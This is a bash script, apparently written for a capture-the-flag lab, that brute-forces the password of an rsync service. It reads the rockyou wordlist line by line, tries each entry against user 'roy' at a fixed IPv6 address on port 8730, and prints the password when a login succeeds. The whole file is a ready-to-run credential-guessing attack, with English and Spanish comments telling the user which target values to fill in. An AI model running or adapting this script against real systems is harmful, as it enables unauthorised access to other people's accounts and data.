#!/bin/bash

function ctrl_c(){
    echo -e "\n Stopping brute_froce_rsync......"
    exit 1
}

trap ctrl_c INT 
user='roy' # U NEED TO KNOW THE USER
folder='home_roy' # U NEED TO KNOW THE FOLDER
ipv6='dead:beef::57a:71c:23:77a' # U NEED TO KNOW THE IPV4 O 6, SI ES 4 VA SIN LOS []

for password in $(cat /usr/share/wordlists/rockyou.txt);
do
    echo -e "\n[+] Checkin password: ${password}\n"
    sshpass -p ${password} rsync rsync://roy@[${ipv6}]:8730/${folder} &>/dev/null
    if [ $(echo $?) -eq 0 ];then
        echo -e "\n[!] password is: ${password}"
        exit 0
    fi
done 